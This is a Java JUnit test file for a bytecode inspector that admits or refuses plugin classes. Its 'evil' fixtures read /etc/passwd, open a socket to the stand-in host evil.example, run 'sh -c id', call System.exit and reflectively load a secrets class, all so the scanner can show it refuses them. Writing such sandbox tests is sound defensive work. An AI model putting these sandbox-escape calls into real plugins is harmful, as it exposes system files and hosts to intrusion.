package com.npdev.kernel.security;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import javax.tools.JavaCompiler;
import javax.tools.StandardJavaFileManager;
import javax.tools.ToolProvider;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * SEC-3 / B30: live-fire tests for the shared bytecode admission inspector -- compiles real
 * classes with the in-test JDK compiler and asserts the constant-pool scan accepts clean plugin
 * code, refuses the SEC-3 escape vectors (System.exit, filesystem, sockets, process control,
 * reflection, threads, async detachment), and does not false-positive on benign neighbours
 * (RuntimeException references, java.util.concurrent.atomic.*).
 */
class TrustedSourceBytecodeInspectorTest {

    @TempDir
    Path tempRoot;

    private final TrustedSourceBytecodeInspector inspector = new TrustedSourceBytecodeInspector();

    @Test
    void acceptsCleanPluginCode() throws Exception {
        // Mirrors the shipped auditLog capability: java.util.* + java.time.* + an AtomicLong
        // counter -- the exact source the pre-existing corpus mounts today.
        Path compiled = compile(
                "com/npdev/samples/clean/AuditLogCapability.java",
                """
                package com.npdev.samples.clean;

                import java.time.Instant;
                import java.util.LinkedHashMap;
                import java.util.Map;
                import java.util.concurrent.atomic.AtomicLong;

                public final class AuditLogCapability {
                    private static final AtomicLong SEQUENCE = new AtomicLong();

                    public Map<String, Object> record(Map<String, Object> input) {
                        long sequence = SEQUENCE.incrementAndGet();
                        Map<String, Object> result = new LinkedHashMap<>();
                        result.put("sequence", sequence);
                        result.put("recordedAt", Instant.now().toString());
                        return result;
                    }
                }
                """
        );
        TrustedSourceBytecodeInspector.BytecodeInspectionResult result = inspector.inspect(compiled);
        assertTrue(result.passed(), "clean plugin class must pass: " + result.violations());
    }

    @Test
    void doesNotFalsePositiveOnRuntimeExceptionOrStringConstants() throws Exception {
        Path compiled = compile(
                "com/npdev/samples/clean/ErrorHandling.java",
                """
                package com.npdev.samples.clean;

                public final class ErrorHandling {
                    public Object run(Object input) {
                        try {
                            return String.valueOf(input).substring(0, 1);
                        } catch (RuntimeException ex) {
                            // RuntimeException must NOT be refused by the java/lang/Runtime rule:
                            // exact-owner matching stops at the letter boundary.
                            return "exit";
                        }
                    }

                    public boolean hasExitWord(String path) {
                        return path.endsWith("exit");
                    }
                }
                """
        );
        TrustedSourceBytecodeInspector.BytecodeInspectionResult result = inspector.inspect(compiled);
        assertTrue(result.passed(), "benign neighbours must pass: " + result.violations());
    }

    @Test
    void refusesSystemExit() throws Exception {
        Path compiled = compile(
                "com/npdev/generated/plugin/evil/ExitPlugin.java",
                """
                package com.npdev.generated.plugin.evil;

                public final class ExitPlugin {
                    public void run() {
                        System.exit(0);
                    }
                }
                """
        );
        TrustedSourceBytecodeInspector.BytecodeInspectionResult result = inspector.inspect(compiled);
        assertFalse(result.passed(), "System.exit must be refused");
        assertTrue(result.violations().stream().anyMatch(v -> v.contains("java/lang/System.exit")),
                "violations must name the System.exit reference: " + result.violations());
    }

    @Test
    void refusesFilesystemIo() throws Exception {
        Path compiled = compile(
                "com/npdev/generated/plugin/evil/FilePlugin.java",
                """
                package com.npdev.generated.plugin.evil;

                public final class FilePlugin {
                    public String read() throws Exception {
                        return java.nio.file.Files.readString(java.nio.file.Path.of("/etc/passwd"));
                    }
                }
                """
        );
        TrustedSourceBytecodeInspector.BytecodeInspectionResult result = inspector.inspect(compiled);
        assertFalse(result.passed(), "filesystem IO must be refused: " + result.violations());
    }

    @Test
    void refusesSocketIo() throws Exception {
        Path compiled = compile(
                "com/npdev/generated/plugin/evil/NetworkPlugin.java",
                """
                package com.npdev.generated.plugin.evil;

                public final class NetworkPlugin {
                    public void connect() throws Exception {
                        try (java.net.Socket socket = new java.net.Socket("evil.example", 443)) {
                            socket.getOutputStream().write(1);
                        }
                    }
                }
                """
        );
        TrustedSourceBytecodeInspector.BytecodeInspectionResult result = inspector.inspect(compiled);
        assertFalse(result.passed(), "socket IO must be refused: " + result.violations());
    }

    @Test
    void refusesProcessBuilder() throws Exception {
        Path compiled = compile(
                "com/npdev/generated/plugin/evil/ProcessPlugin.java",
                """
                package com.npdev.generated.plugin.evil;

                public final class ProcessPlugin {
                    public void run() throws Exception {
                        new ProcessBuilder("sh", "-c", "id").start();
                    }
                }
                """
        );
        TrustedSourceBytecodeInspector.BytecodeInspectionResult result = inspector.inspect(compiled);
        assertFalse(result.passed(), "ProcessBuilder must be refused: " + result.violations());
    }

    @Test
    void refusesDetachedAsyncWork() throws Exception {
        Path compiled = compile(
                "com/npdev/generated/plugin/evil/AsyncPlugin.java",
                """
                package com.npdev.generated.plugin.evil;

                import java.util.concurrent.CompletableFuture;

                public final class AsyncPlugin {
                    public void run() {
                        CompletableFuture.runAsync(() -> {
                            while (true) {
                            }
                        });
                    }
                }
                """
        );
        TrustedSourceBytecodeInspector.BytecodeInspectionResult result = inspector.inspect(compiled);
        assertFalse(result.passed(), "CompletableFuture must be refused (detached work outlives the timeout): " + result.violations());
    }

    @Test
    void refusesLambdaBodyInTheSameClassFile() throws Exception {
        // Lambda bodies are compiled as synthetic methods IN the owner class file, so a lambda
        // calling System.exit must be caught by inspecting the outer class alone.
        Path compiled = compile(
                "com/npdev/generated/plugin/evil/LambdaPlugin.java",
                """
                package com.npdev.generated.plugin.evil;

                public final class LambdaPlugin {
                    public Runnable exit() {
                        return () -> System.exit(0);
                    }
                }
                """
        );
        TrustedSourceBytecodeInspector.BytecodeInspectionResult result = inspector.inspect(compiled);
        assertFalse(result.passed(), "lambda body in the same class file must be refused: " + result.violations());
    }

    @Test
    void acceptsConsolePrintln() throws Exception {
        // System.out/System.err reference java/io/PrintStream, exempted from the java/io/ ban:
        // console output is not filesystem IO (the shipped lib-probe logs a diagnostic this way).
        Path compiled = compile(
                "com/npdev/generated/plugin/clean/ConsoleLog.java",
                """
                package com.npdev.generated.plugin.clean;

                public final class ConsoleLog {
                    public void log(String message) {
                        System.out.println("[plugin] " + message);
                    }
                }
                """
        );
        TrustedSourceBytecodeInspector.BytecodeInspectionResult result = inspector.inspect(compiled);
        assertTrue(result.passed(), "System.out.println must pass: " + result.violations());
    }

    @Test
    void refusesReflectiveClassLoading() throws Exception {
        Path compiled = compile(
                "com/npdev/generated/plugin/evil/ReflectivePlugin.java",
                """
                package com.npdev.generated.plugin.evil;

                public final class ReflectivePlugin {
                    public Object load() throws Exception {
                        return Class.forName("com.internal.Secrets").getConstructor().newInstance();
                    }
                }
                """
        );
        TrustedSourceBytecodeInspector.BytecodeInspectionResult result = inspector.inspect(compiled);
        assertFalse(result.passed(), "Class.forName must be refused: " + result.violations());
    }

    private Path compile(String relativeSource, String source) throws Exception {
        Path sourceFile = tempRoot.resolve(relativeSource);
        Files.createDirectories(sourceFile.getParent());
        Files.writeString(sourceFile, source);
        Path outputRoot = tempRoot.resolve("classes");
        JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
        List<String> options = new ArrayList<>(List.of("-encoding", "UTF-8", "-d", outputRoot.toString(), "-proc:none"));
        try (StandardJavaFileManager fileManager = compiler.getStandardFileManager(null, null, java.nio.charset.StandardCharsets.UTF_8)) {
            Iterable<? extends javax.tools.JavaFileObject> units =
                    fileManager.getJavaFileObjectsFromPaths(List.of(sourceFile));
            boolean ok = Boolean.TRUE.equals(compiler.getTask(null, fileManager, null, options, null, units).call());
            if (!ok) {
                throw new IllegalStateException("Test fixture failed to compile: " + relativeSource);
            }
        }
        String classRelative = relativeSource.substring(0, relativeSource.length() - ".java".length()) + ".class";
        return outputRoot.resolve(classRelative);
    }
}